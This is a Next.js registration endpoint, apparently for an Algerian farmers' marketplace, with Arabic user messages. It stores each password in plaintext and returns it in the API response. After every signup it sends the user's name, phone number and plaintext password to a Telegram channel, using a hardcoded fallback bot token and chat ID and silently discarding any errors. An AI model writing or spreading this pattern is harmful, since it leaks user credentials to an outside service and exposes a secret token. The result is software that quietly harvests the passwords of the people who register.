import { NextResponse } from 'next/server';
import { db } from '@/db/index';
import { users } from '@/db/schema';
import { eq } from 'drizzle-orm';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { fullName, phone, password, role = 'farmer', wilayaCode = '16', commune = '' } = body;

    if (!fullName || !phone || !password) {
      return NextResponse.json(
        { status: 'error', message: 'يرجى إدخال الاسم واللقب، رقم الهاتف، وكلمة السر' },
        { status: 400 }
      );
    }

    const cleanPhone = String(phone).trim();

    // Check if phone already exists
    const existing = await db.select().from(users).where(eq(users.phone, cleanPhone));
    if (existing.length > 0) {
      return NextResponse.json(
        { status: 'error', message: 'رقم الهاتف هذا مسجل بالفعل. يمكنك تسجيل الدخول بدلاً من ذلك' },
        { status: 400 }
      );
    }

    const [newUser] = await db
      .insert(users)
      .values({
        fullName: String(fullName).trim(),
        phone: cleanPhone,
        password: String(password),
        role: String(role),
        wilayaCode: String(wilayaCode),
        commune: String(commune),
        subscriptionStatus: 'pending',
      })
      .returning();

    // Notify channel on Telegram with credentials
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8529857614:AAFqiz0Y_y-11gZSjgGAfcCbV3j42er720c';
    const channelId = process.env.ADMIN_CHANNEL_CHAT_ID || '-1004308858796';
    if (TELEGRAM_BOT_TOKEN && channelId) {
      try {
        const msg = `
👤 <b>تسجيل حساب جديد بالبورصة:</b>

• 📝 الاسم واللقب: <b>${newUser.fullName}</b>
• 📱 رقم الهاتف: <code>${newUser.phone}</code>
• 🔑 كلمة السر: <code>${newUser.password}</code>
• 📍 الولاية: <b>${newUser.wilayaCode}</b>
• 💼 الصفة: <b>${newUser.role}</b>
        `;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: channelId, text: msg, parse_mode: 'HTML' }),
        }).catch(() => {});
      } catch (e) {}
    }

    return NextResponse.json({
      status: 'success',
      message: 'تم إنشاء الحساب بنجاح',
      user: {
        id: newUser.id,
        fullName: newUser.fullName,
        phone: newUser.phone,
        role: newUser.role,
        wilayaCode: newUser.wilayaCode,
        password: newUser.password,
      },
    });
  } catch (error: any) {
    console.error('Registration error:', error);
    return NextResponse.json(
      { status: 'error', message: error.message || 'خطأ أثناء إنشاء الحساب' },
      { status: 500 }
    );
  }
}
